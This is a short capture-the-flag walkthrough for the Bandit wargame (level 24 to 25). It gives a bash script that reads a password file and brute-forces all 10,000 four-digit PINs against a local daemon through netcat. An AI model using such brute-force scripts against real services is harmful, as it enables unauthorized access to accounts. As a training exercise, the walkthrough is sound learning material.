# Bandit Level 24 → Level 25

> A daemon listens on port `30002` and requires the current Bandit 24 password along with a secret four-digit PIN. The PIN must be discovered by brute-forcing all 10,000 possible combinations using a single connection.

## Steps

1. **Create a Temporary Working Directory:** Run `mktemp -d` to create a temporary directory for the brute-force script, then navigate into it.
2. **Create the Brute-Force Script:** Create `script.sh` with the following content:

   ```bash
   #!/bin/bash

   password=$(cat /etc/bandit_pass/bandit24)
   
   for pin in {0000..9999}; do
       printf '%s %s\n' "$password" "$pin"
   done | nc 127.0.0.1 30002
   ```

3. **Make the Script Executable:** Run:
   ```bash
   chmod +x script.sh
   ```
4. **Execute the Script:** Run:
   ```bash
   ./script.sh
   ```
   The script generates all 10,000 PIN combinations, appends each PIN to the current password, and sends them through a single Netcat connection.
5. **Retrieve the Password:** The daemon checks each attempt and responds with `Correct!` when the valid PIN is found, followed by the password for Level 25.
